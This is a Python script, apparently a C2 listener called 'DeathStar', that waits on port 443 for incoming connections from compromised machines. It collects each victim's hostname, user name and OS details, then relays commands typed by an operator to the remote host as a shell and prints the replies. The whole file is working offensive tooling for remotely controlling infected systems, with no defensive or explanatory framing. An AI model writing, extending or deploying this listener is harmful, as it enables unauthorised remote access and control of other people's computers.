import asyncio
import signal
import sys
from datetime import datetime

# Global variables to track connections
current_session = None
current_writer = None

async def handle_client(reader, writer):
    global current_session, current_writer
    
    addr = writer.get_extra_info('peername')
    client_ip = addr[0]
    
    try:
        # Initial connection data
        await reader.read(1024)  # Initial empty data
        
        # Get hostname
        writer.write(b"hostname\n")
        await writer.drain()
        hostname = (await reader.read(1024)).decode('utf-8').strip()
        
        # Get username
        writer.write(b"whoami\n")
        await writer.drain()
        username = (await reader.read(1024)).decode('utf-8').strip()
        
        # Get OS info
        writer.write(b"osinfo\n")
        await writer.drain()
        os_info = (await reader.read(1024)).decode('utf-8').strip()

        print(f"\n[+] New connection from {client_ip}")
        print(f"[*] Hostname: {hostname}")
        print(f"[*] Username: {username}")
        print(f"[*] OS: {os_info}")
        print(f"[*] Connected: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        current_session = client_ip
        current_writer = writer
        
        while True:
            try:
                command = input(f"\n{username}@{hostname}> ")
                
                if command.lower() == 'kill-session':
                    print("[!] Terminating session...")
                    writer.write(b"die\n")
                    await writer.drain()
                    break
                
                if not command:
                    continue
                
                writer.write(f"{command}\n".encode())
                await writer.drain()
                
                response = await reader.read(4096)
                if not response:
                    break
                    
                print(response.decode('utf-8').strip())
                
            except EOFError:
                break
                
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        print(f"\n[!] Connection from {client_ip} closed")
        current_session = None
        current_writer = None
        writer.close()
        await writer.wait_closed()

async def start_server():
    server = await asyncio.start_server(
        handle_client, '0.0.0.0', 443
    )
    
    print("""
    ▓█████▄ ▓█████ ▄▄▄     ▄▄▄█████▓ ██░ ██   ██████ ▄▄▄█████▓ ▄▄▄       ██▀███  
    ▒██▀ ██▌▓█   ▀▒████▄   ▓  ██▒ ▓▒▓██░ ██▒▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓██ ▒ ██▒
    ░██   █▌▒███  ▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▓██ ░▄█ ▒
    ░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██   ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▀▀█▄  
    ░▒████▓ ░▒████▒▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░██▓ ▒██▒
     ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ▒▓ ░▒▓░
     ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░   ░     ▒ ░▒░ ░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░▒ ░ ▒░
     ░ ░  ░    ░    ░   ▒    ░       ░  ░░ ░░  ░  ░    ░        ░   ▒     ░░   ░ 
       ░       ░  ░     ░  ░         ░  ░  ░      ░                 ░  ░   ░     
     ░                                                                            
    """)
    print("[*] DeathStar listener running on port 443")
    print("[*] Waiting for connections...")
    
    async with server:
        await server.serve_forever()

def signal_handler(sig, frame):
    print("\n[!] Shutting down...")
    if current_writer:
        asyncio.run(current_writer.write(b"die\n"))
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    asyncio.run(start_server()) 
